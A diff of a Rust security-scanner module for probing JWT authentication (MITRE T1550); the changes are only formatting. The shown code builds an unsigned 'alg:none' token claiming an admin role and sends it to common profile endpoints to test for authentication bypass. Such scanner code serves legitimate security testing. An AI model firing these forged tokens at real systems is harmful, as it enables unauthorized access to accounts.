@@ -2,15 +2,20 @@
 //! MITRE: T1550 (Use Alternate Authentication Material).
 
 use crate::engine_probes::{
-    empty_ok, finding_with_probe_depth, http_client, http_get, http_get_with_headers,
-    normalize_url,
+    empty_ok, finding_with_probe_depth, http_client, http_get, http_get_with_headers, normalize_url,
 };
 use crate::engine_result::{print_result, EngineResult};
 use serde_json::{json, Value};
 
 const JWT_PROBE_DEPTH: &str = "jwt_auth_surface";
 
-fn jwt_finding(title: &str, severity: &str, description: &str, target: &str, extra: Value) -> Value {
+fn jwt_finding(
+    title: &str,
+    severity: &str,
+    description: &str,
+    target: &str,
+    extra: Value,
+) -> Value {
     let mut f = finding_with_probe_depth(
         "jwt_attack",
         title,
@@ -36,9 +41,11 @@ fn looks_like_jwt(value: &str) -> bool {
     if parts.len() != 3 {
         return false;
     }
-    parts
-        .iter()
-        .all(|p| !p.is_empty() && p.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '='))
+    parts.iter().all(|p| {
+        !p.is_empty()
+            && p.chars()
+                .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '=')
+    })
 }
 
 fn b64url_decode(s: &str) -> Option<String> {
@@ -159,7 +166,14 @@ pub async fn run_jwt_attack_result(target: &str) -> EngineResult {
     let admin_payload = "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9";
     let none_jwt = format!("{}.{}.", none_header, admin_payload);
 
-    for path in ["/api/me", "/api/user", "/profile", "/api/profile", "/v1/me", "/api/v1/me"] {
+    for path in [
+        "/api/me",
+        "/api/user",
+        "/profile",
+        "/api/profile",
+        "/v1/me",
+        "/api/v1/me",
+    ] {
         let url = format!("{}{}", base.trim_end_matches('/'), path);
         let baseline = http_get(&client, &url).await;
         let forged = http_get_with_headers(
